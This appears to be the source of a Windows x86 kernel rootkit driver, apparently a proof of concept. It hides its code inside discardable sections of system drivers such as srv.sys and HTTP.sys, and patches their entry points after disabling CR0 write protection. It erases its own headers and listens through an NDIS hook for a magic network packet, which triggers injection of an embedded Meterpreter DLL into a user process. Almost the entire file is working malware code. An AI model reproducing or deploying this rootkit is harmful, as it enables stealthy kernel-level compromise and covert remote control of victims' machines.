#include "stdafx.h"

#pragma comment(linker,"/MERGE:.rdata=.text") 
#pragma comment(linker,"/MERGE:.edata=.text") 

#pragma section("INIT",read,write,execute)

extern "C"
{    
    NTSTATUS NewDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
    void HookImageEntry(PVOID Image);
    BOOLEAN CheckForFreeArea(PVOID Image, PULONG FreeAreaRVA, PULONG FreeAreaLength);
    VOID LoadImageNotify(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo);
    VOID DriverEntryInitializePayload(PUCHAR PointerFixup);
};

#pragma alloc_text(INIT, ClearWp)
#pragma alloc_text(INIT, SetWp)
#pragma alloc_text(INIT, NewDriverEntry)
#pragma alloc_text(INIT, HookImageEntry)
#pragma alloc_text(INIT, CheckForFreeArea)
#pragma alloc_text(INIT, LoadImageNotify)
#pragma alloc_text(INIT, DriverEntryInitializePayload)

// user-mode DLL file
#ifdef DBGMSG
__declspec(allocate("INIT"))
#include "../includes/meterpreter_debug.dll.h"
#else
__declspec(allocate("INIT"))
#include "../includes/meterpreter.dll.h"
#endif

// defined in runtime.cpp
extern PVOID m_DriverBase;
ULONG m_DriverSize = 0;
BOOLEAN m_bDriverMustBeFreed = FALSE;

ULONG m_RkOffset = 0, m_RkSize = 0;
PVOID m_FreeAreaFound = NULL;

#define EP_PATCH_SIZE 6
UCHAR m_EpOriginalBytes[EP_PATCH_SIZE];
DRIVER_INITIALIZE *m_HookedEntry = NULL;

PVOID m_Payload = NULL;
ULONG m_PayloadSize = 0;
//--------------------------------------------------------------------------------------
VOID InjectPayloadThread(PVOID Param)
{
    if (m_Payload && m_PayloadSize > 0)
    {
        // inject user mode payload into the process
        InjectIntoProcessByName(METERPRETER_PROCESS, m_Payload, m_PayloadSize);
    }
}
//--------------------------------------------------------------------------------------
void NTAPI NdisHookHandleBuffer(PVOID MiniportHandle, PVOID Buffer, ULONG Size)
{
    if (Size < sizeof(NET_ETH_HEADER) + sizeof(NET_IPv4_HEADER))
    {
        // buffer is too small
        return;
    }

    // check the ethernet header
    PNET_ETH_HEADER Eth = (PNET_ETH_HEADER)Buffer;
    if (Eth->Type != HTONS(ETH_P_IP))
    {
        // not a internet protocl packet
        return;
    }

    // check the IP header
    PNET_IPv4_HEADER Ip = (PNET_IPv4_HEADER)((PUCHAR)Eth + sizeof(NET_ETH_HEADER));

    if (Ip->Version != 4 || Ip->HeaderLength * 4 != sizeof(NET_IPv4_HEADER))
    {
        // not a IPv4 packet
        return;
    }

    if (Ip->Protocol != IPPROTO_ICMP && Ip->Protocol != IPPROTO_IP && Ip->Protocol != IPPROTO_UDP)
    {
        // unknown protocol
        return;
    }

    if (HTONS(Ip->TotalLength) + sizeof(NET_ETH_HEADER) > Size)
    {
        // total length out of bounds
        return;
    }

    // remember and reset checksum
    USHORT Sum = Ip->Checksum; Ip->Checksum = 0;

    // validate checksum
    if (Sum != Checksum(Ip, sizeof(NET_IPv4_HEADER)))
    {
        return;
    }

    char Dst[16], Src[16];
    strcpy(Dst, inet_ntoa(Ip->Dst));    
    strcpy(Src, inet_ntoa(Ip->Src));    

    DbgMsg(
        __FUNCTION__"() IP: From = %s, To = %s, Protocol = %d, Length = %d\n",
        Src, Dst, Ip->Protocol, HTONS(Ip->TotalLength)
    );

    // find magic sequence in packet
    char *lpszMagic = "RKCTL:" ROOTKIT_CTL_KEY;
    for (ULONG i = 0; i < Size - strlen(lpszMagic); i++)
    {
        if (RtlCompareMemory((PUCHAR)Buffer + i, lpszMagic, strlen(lpszMagic)) == strlen(lpszMagic))
        {
            DbgMsg(__FUNCTION__"(): Magic sequence has been find in network packet!\n");
            
            // we are at DPC level: create thread for execution of process injection code
            HANDLE hThread = NULL;
            NTSTATUS ns = PsCreateSystemThread(
                &hThread, 
                THREAD_ALL_ACCESS, 
                NULL, NULL, NULL, 
                InjectPayloadThread, 
                NULL
            );
            if (NT_SUCCESS(ns))
            {
                ZwClose(hThread);
            }
            else
            {
                DbgMsg("PsCreateSystemThread() fails: 0x%.8x\n", ns);
            }

            break;
        }
    }    
}
//--------------------------------------------------------------------------------------
VOID DriverEntryContinueThread(PVOID Param)
{
    /**
     * Hidden rootkit code starts execution here.
     */

    LARGE_INTEGER Timeout = { 0 };
    Timeout.QuadPart = TIME_RELATIVE(TIME_SECONDS(3));  

    DbgPrint(__FUNCTION__"(): Param = "IFMT"\n", Param);

    // initialize NDIS hook data handler
    NdisHookInitialize(NdisHookHandleBuffer);

    // initialize DLL injector
    InjectInitialize();

    KeDelayExecutionThread(KernelMode, FALSE, &Timeout);

    if (Param)
    {
        // free memory, that has been allocated for driver        
        ExFreePool(Param);
    }    

#ifndef USE_STEALTH_IMAGE

    if (m_DriverBase)
    {
        PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
            ((PUCHAR)m_DriverBase + ((PIMAGE_DOS_HEADER)m_DriverBase)->e_lfanew);

        // erase image headers
        RtlZeroMemory(m_DriverBase, pHeaders->OptionalHeader.SizeOfHeaders);
    }

#endif // USE_STEALTH_IMAGE    

#ifdef USE_GREETING_MESSAGE

    while (true)
    {
        DbgPrint(__FUNCTION__"(): Commertial malware rootkits are sucks!\n");

        // sleep
        KeDelayExecutionThread(KernelMode, FALSE, &Timeout);        
    }

#endif // USE_GREETING_MESSAGE
    
}
//--------------------------------------------------------------------------------------
void DriverEntryInitializePayload(PUCHAR PointerFixup)
{
    /*
        Perform payload initialization here
    */
    
    NdisHookSet(PointerFixup);

    // allocate memory for payload in non-paged pool
    ULONG PayloadSize = sizeof(dll);
    PVOID Payload = ExAllocatePool(NonPagedPool, PayloadSize);
    if (Payload)
    {
        RtlCopyMemory(Payload, dll, sizeof(dll));

        PULONG pPayloadSize = (PULONG)RECALCULATE_POINTER(&m_PayloadSize);
        PVOID *pPayload = (PVOID *)RECALCULATE_POINTER(&m_Payload);

        *pPayloadSize = PayloadSize;
        *pPayload = Payload;
    }
    else
    {
        DbgMsg("ExAllocatePool() fails\n");
    }
}
//--------------------------------------------------------------------------------------
#ifdef _X86_
//--------------------------------------------------------------------------------------
void ClearWp(void)
{
    // allow to execute the code only on the 1-st CPU
    KeSetSystemAffinityThread(0x00000001);

    __asm
    {              
        mov     eax, cr0             
        and     eax, not 000010000h
        mov     cr0, eax
    }
}

void SetWp(void)
{
    __asm
    {
        mov     eax, cr0
        or      eax, 000010000h
        mov     cr0, eax
    }
}
//--------------------------------------------------------------------------------------
#endif // _X86_
//--------------------------------------------------------------------------------------
PVOID DoPointerFixup(PVOID Ptr, PUCHAR PointerFixup)
{

#ifdef USE_STEALTH_IMAGE

    if (m_DriverBase == NULL)
    {
        return Ptr;
    }

    return (PUCHAR)Ptr - (PUCHAR)m_DriverBase + PointerFixup;

#else // USE_STEALTH_IMAGE

    return Ptr;

#endif //USE_STEALTH_IMAGE

}
//--------------------------------------------------------------------------------------
NTSTATUS NewDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{    
    // disable memory write protection
    ClearWp();

    // restore original code from image entry point
    memcpy(m_HookedEntry, m_EpOriginalBytes, EP_PATCH_SIZE);

    // enable memory write protection
    SetWp();

    NTSTATUS ns = m_HookedEntry(DriverObject, RegistryPath);
    DbgMsg(__FUNCTION__"(): Hooked driver returns 0x%.8x\n", ns);    

    if (PsRemoveLoadImageNotifyRoutine(LoadImageNotify) == STATUS_SUCCESS)
    {
        m_bDriverMustBeFreed = TRUE;
    }

    if (NT_SUCCESS(ns))
    {
        PVOID Image = ExAllocatePool(NonPagedPool, m_DriverSize);
        if (Image)
        {
            // prepare rootkit code for injection into the discardable sections
            memcpy(Image, m_DriverBase, m_DriverSize);
            RuntimeProcessRelocs(Image, (PVOID)((PUCHAR)m_FreeAreaFound - m_RkOffset));

            // disable memory write protection
            ClearWp();

            memcpy(m_FreeAreaFound, RVATOVA(Image, m_RkOffset), m_RkSize);

            // enable memory write protection
            SetWp();

            PUCHAR PointerFixup = (PUCHAR)m_FreeAreaFound - m_RkOffset;

            // set up NDIS hooks
            DriverEntryInitializePayload(PointerFixup);

            PKSTART_ROUTINE Start = (PKSTART_ROUTINE)RECALCULATE_POINTER(DriverEntryContinueThread);

            DbgMsg(__FUNCTION__"(): Start address: "IFMT"\n", Start);

            // create thread for execution copied code
            HANDLE hThread = NULL;
            ns = PsCreateSystemThread(
                &hThread, 
                THREAD_ALL_ACCESS, 
                NULL, NULL, NULL, 
                Start, 
                m_bDriverMustBeFreed ? m_DriverBase : NULL
            );
            if (NT_SUCCESS(ns))
            {
                ZwClose(hThread);
            }
            else
            {
                DbgMsg("PsCreateSystemThread() fails: 0x%.8x\n", ns);
            }

            ExFreePool(Image);
        }

        // don't allow to unload target driver
        DriverObject->DriverUnload = NULL;
    }

    return ns;
}
//--------------------------------------------------------------------------------------
void HookImageEntry(PVOID Image)
{
    PIMAGE_NT_HEADERS32 pHeaders = (PIMAGE_NT_HEADERS32)
        ((PUCHAR)Image + ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    PUCHAR Entry = (PUCHAR)RVATOVA(Image, pHeaders->OptionalHeader.AddressOfEntryPoint);

    // save original code from image entry point
    memcpy(m_EpOriginalBytes, Entry, EP_PATCH_SIZE);
    m_HookedEntry = (DRIVER_INITIALIZE *)Entry;

    // disable memory write protection
    ClearWp();

#ifdef _X86_

    // patch image entry point
    *(PUCHAR)(Entry + 0) = 0x68;
    *(PVOID*)(Entry + 1) = NewDriverEntry;
    *(PUCHAR)(Entry + 5) = 0xC3;

#else // _X86_

#error __FUNCTION__ is x86 only

#endif // _X86_

    // enable memory write protection
    SetWp();

    DbgMsg( 
        __FUNCTION__"(): Image entry point hooked ("IFMT" -> "IFMT")\n",
        Entry, NewDriverEntry
    );
}
//--------------------------------------------------------------------------------------
BOOLEAN CheckForFreeArea(PVOID Image, PULONG FreeAreaRVA, PULONG FreeAreaLength)
{
    *FreeAreaRVA = NULL;
    *FreeAreaLength = 0;

    PIMAGE_NT_HEADERS32 pHeaders = (PIMAGE_NT_HEADERS32)
        ((PUCHAR)Image + ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
        (pHeaders->FileHeader.SizeOfOptionalHeader + 
        (PUCHAR)&pHeaders->OptionalHeader);

    ULONG AreaRVA = NULL;
    ULONG AreaLength = 0;

    // enumerate image sections
    for (ULONG i = 0; i < pHeaders->FileHeader.NumberOfSections; i++)
    {            
        PVOID SectionVa = RVATOVA(Image, pSection->VirtualAddress);
        char szSectionName[IMAGE_SIZEOF_SHORT_NAME + 1];

        // check for discardable attribute
        if ((pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) &&
            my_strcmp(szSectionName, "INIT"))
        {            
            if (AreaRVA && pSection->VirtualAddress == AreaRVA + AreaLength)
            {
                // concatenate with the previously found section
                AreaLength += MY_ALIGN_UP(pSection->Misc.VirtualSize, pHeaders->OptionalHeader.SectionAlignment);
            }
            else
            {
                AreaRVA = pSection->VirtualAddress;
                AreaLength = MY_ALIGN_UP(pSection->Misc.VirtualSize, pHeaders->OptionalHeader.SectionAlignment);
            }            
        }

        pSection += 1;
    }

    if (AreaLength >= m_RkSize)
    {
        DbgMsg("%d free bytes at 0x%.8x\n", AreaLength, AreaRVA);

        *FreeAreaRVA = AreaRVA;
        *FreeAreaLength = AreaLength;

        pSection = (PIMAGE_SECTION_HEADER)
            (pHeaders->FileHeader.SizeOfOptionalHeader + 
            (PUCHAR)&pHeaders->OptionalHeader);

        // erase discardable flag
        for (ULONG i = 0; i < pHeaders->FileHeader.NumberOfSections; i++)
        {
            pSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
            pSection += 1;
        }

        return TRUE;
    }    

    return FALSE;
}
//--------------------------------------------------------------------------------------
/*
kd> kb
ChildEBP RetAddr  Args to Child              
f8afdaa8 805c62ae f8afdcf0 00000000 f8afdb44 DrvHide!LoadImageNotify+0x10
f8afdac8 805a4159 f8afdcf0 00000000 f8afdb44 nt!PsCallImageNotifyRoutines+0x36
f8afdc6c 80576483 f8afdcf0 00000000 00000000 nt!MmLoadSystemImage+0x9e5
f8afdd4c 8057688f 80000378 00000001 00000000 nt!IopLoadDriver+0x371
f8afdd74 80534c02 80000378 00000000 823c63c8 nt!IopLoadUnloadDriver+0x45
f8afddac 805c6160 b286ecf4 00000000 00000000 nt!ExpWorkerThread+0x100
f8afdddc 80541dd2 80534b02 00000001 00000000 nt!PspSystemThreadStartup+0x34
00000000 00000000 00000000 00000000 00000000 nt!KiThreadStartup+0x16
*/

// images for storing malicious code
PWSTR m_Images[] = 
{
    L"\\HTTP.sys",
    L"\\mrxsmb.sys",
    L"\\mrxsmb10.sys",
    L"\\mrxsmb20.sys",
    L"\\srv.sys",
    L"\\srv2.sys",
    L"\\secdrv.sys"
};

VOID LoadImageNotify(
   PUNICODE_STRING FullImageName,
   HANDLE ProcessId, // where image is mapped
   PIMAGE_INFO ImageInfo)
{
    if (m_FreeAreaFound)
    {
        return;
    }

    // check for kernel driver
    if (ProcessId == 0 && ImageInfo->SystemModeImage)
    {        
        BOOLEAN bImageFound = FALSE;
        PVOID TargetImageBase = ImageInfo->ImageBase;
        ULONG TargetImageSize = ImageInfo->ImageSize;

        DbgMsg(
            __FUNCTION__"(): '%wZ' is at "IFMT", size=%d\n", 
            FullImageName, TargetImageBase, TargetImageSize
        );

        // check for the known image
        for (ULONG i = 0; i < sizeof(m_Images) / sizeof(PWSTR); i++)
        {
            UNICODE_STRING usName;
            RtlInitUnicodeString(&usName, m_Images[i]);

            if (EqualUnicodeString_r(FullImageName, &usName, TRUE))
            {
                bImageFound = TRUE;
                break;
            }
        }

        if (bImageFound)
        {
            // check for the free space in image discardable sections
            ULONG FreeAreaRVA = 0, FreeAreaLength = 0;
            if (CheckForFreeArea(TargetImageBase, &FreeAreaRVA, &FreeAreaLength))
            {
                // copy malicious code into this image
                m_FreeAreaFound = RVATOVA(TargetImageBase, FreeAreaRVA);
                HookImageEntry(TargetImageBase);
            }
        }        
    }
}
//--------------------------------------------------------------------------------------
NTSTATUS 
NTAPI
DriverEntry(
    PDRIVER_OBJECT  DriverObject,
    PUNICODE_STRING RegistryPath)
{
    if (!RuntimeInitialize(DriverObject, RegistryPath))
    {
        return STATUS_UNSUCCESSFUL;
    }

    DbgMsg(__FUNCTION__"(): Loaded at "IFMT"\n", m_DriverBase);

    // initialize NDIS structures offsets
    NdisHookInitialize(NULL);

#ifdef USE_STEALTH_IMAGE

    if (m_DriverBase == NULL)
    {
        return STATUS_UNSUCCESSFUL;
    }

    PIMAGE_NT_HEADERS32 pHeaders = (PIMAGE_NT_HEADERS32)((PUCHAR)m_DriverBase + 
        ((PIMAGE_DOS_HEADER)m_DriverBase)->e_lfanew);

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
        (pHeaders->FileHeader.SizeOfOptionalHeader + 
        (PUCHAR)&pHeaders->OptionalHeader);

    // calculate size, that require for rootkit code
    for (ULONG i = 0; i < pHeaders->FileHeader.NumberOfSections; i++)
    {            
        if (m_RkOffset == 0)
        {
            m_RkOffset = pSection->VirtualAddress;
        }

        if (pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)
        {
            // erase discardable flag from our driver sections
            pSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
        }
        else
        {
            m_RkSize += MY_ALIGN_UP(
                pSection->Misc.VirtualSize, 
                pHeaders->OptionalHeader.SectionAlignment
            );
        }
        
        pSection += 1;
    }

    DbgMsg("Rootkit code: 0x%x bytes from 0x%.8x\n", m_RkSize, m_RkOffset);

    // to deal with ProcessRelocs()
    pHeaders->OptionalHeader.ImageBase = (ULONG)m_DriverBase;
    m_DriverSize = pHeaders->OptionalHeader.SizeOfImage;

    NTSTATUS ns = PsSetLoadImageNotifyRoutine(LoadImageNotify);
    if (!NT_SUCCESS(ns))
    {
        DbgMsg("PsSetLoadImageNotifyRoutine() fails: 0x%.8x\n", ns);
    }

#else // USE_STEALTH_IMAGE

    DriverEntryInitializePayload(NULL);   

    HANDLE hThread = NULL;
    NTSTATUS ns = PsCreateSystemThread(
        &hThread, 
        THREAD_ALL_ACCESS, 
        NULL, NULL, NULL, 
        DriverEntryContinueThread, 
        NULL
    );
    if (NT_SUCCESS(ns))
    {
        ZwClose(hThread);
    }
    else
    {
        DbgMsg("PsCreateSystemThread() fails: 0x%.8x\n", ns);
    }

#endif // USE_STEALTH_IMAGE

    return STATUS_SUCCESS;
}
//--------------------------------------------------------------------------------------
// EoF
